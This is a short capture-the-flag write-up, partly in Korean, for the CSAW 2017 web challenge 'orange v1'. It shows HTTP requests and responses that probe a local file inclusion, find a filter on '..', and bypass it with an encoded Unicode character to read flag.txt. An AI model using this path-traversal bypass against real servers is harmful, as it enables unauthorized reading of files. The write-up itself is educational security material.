# [2017_CSAW] \[WEB] orange v1

###Solution

```
http "http://web.chal.csaw.io:7311/index.php?path=orange.txt"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 14
Date: Wed, 20 Sep 2017 00:48:08 GMT

i love oranges
```

```
http "http://web.chal.csaw.io:7311/index.php?path=./orange.txt"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 14
Date: Wed, 20 Sep 2017 00:48:19 GMT

i love oranges
```

LFI 문제로 보입니다. 상위 폴더에 있는 flag.txt를 읽어야 합니다.



```
http "http://web.chal.csaw.io:7311/index.php?path=./"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 412
Date: Wed, 20 Sep 2017 00:48:23 GMT

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /poems/./</title>
<body>
<h2>Directory listing for /poems/./</h2>
<hr>
<ul>
<li><a href="burger.txt">burger.txt</a>
<li><a href="haiku.txt">haiku.txt</a>
<li><a href="orange.txt">orange.txt</a>
<li><a href="ppp.txt">ppp.txt</a>
<li><a href="the_red_wheelbarrow.txt">the_red_wheelbarrow.txt</a>
</ul>
<hr>
</body>
</html>
```

디렉토리 리스팅이 가능하고



```
http "http://web.chal.csaw.io:7311/index.php?path=../poems/orange.txt"
HTTP/1.1 403 Forbidden
Connection: keep-alive
Date: Wed, 20 Sep 2017 00:48:36 GMT
Transfer-Encoding: chunked

WHOA THATS BANNED!!!!
```

`..` 문자는 필터링 됩니다.



HITCON 팀이 블랙햇에서 발표된 내용을 참고하여 풀었습니다. 유니코드 문자를 이용하면 필터링을 우회할 수 있습니다. (https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

```
http "http://web.chal.csaw.io:7311/index.php?path=.%EF%BC%AE/flag.txt"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 51
Date: Wed, 20 Sep 2017 00:54:08 GMT

flag{thank_you_based_orange_for_this_ctf_challenge}
```

